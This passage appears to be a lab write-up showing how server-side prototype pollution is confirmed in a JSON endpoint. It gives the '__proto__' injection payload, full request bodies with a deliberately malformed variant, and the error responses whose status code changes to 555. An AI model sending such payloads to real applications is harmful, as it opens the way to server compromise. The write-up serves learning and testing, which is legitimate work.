# Exploitation

## Polluting the `status` property

The next step was to identify a security-relevant or observable property that could be controlled through prototype pollution.

The error object contained:

```json
"status": 400,
"statusCode": 400
```

The payload was therefore modified to inject an alternative status value:

```json
"__proto__": {
  "status": 555
}
```

The complete valid request body was:

```json
{
  "address_line_1": "Wiener HQ",
  "address_line_2": "One Wiener Way",
  "city": "Tarragona",
  "postcode": "BU1 1RP",
  "country": "UK",
  "sessionId": "3A9lwzyirazbIhiAxpCdPuEcErrZYVc6",
  "__proto__": {
    "status": 555
  }
}
```

The valid request returned the normal `200 OK` response.

This was expected because the normal user object did not expose the polluted `status` property.

---

# Triggering the Gadget

The JSON syntax was then intentionally broken again while keeping the prototype pollution payload:

```json
{
  "address_line_1": "Wiener HQ",
  "address_line_2": "One Wiener Way"
  "city": "Tarragona",
  "postcode": "BU1 1RP",
  "country": "UK",
  "sessionId": "3A9lwzyirazbIhiAxpCdPuEcErrZYVc6",
  "__proto__": {
    "status": 555
  }
}
```

The server returned:

```http
HTTP/2 500 Internal Server Error
```

However, the JSON error object was now:

```json
{
  "error": {
    "expose": false,
    "statusCode": 555,
    "status": 555,
    "body": "...",
    "type": "entity.parse.failed",
    "foo": "bar"
  }
}
```

The critical evidence was:

```json
"statusCode": 555,
"status": 555
```

The original error response contained:

```json
"statusCode": 400,
"status": 400
```

After prototype pollution, both values were changed to the attacker-controlled value:

```text
555
```

This confirmed that the application was reading the polluted `status` property from the prototype.

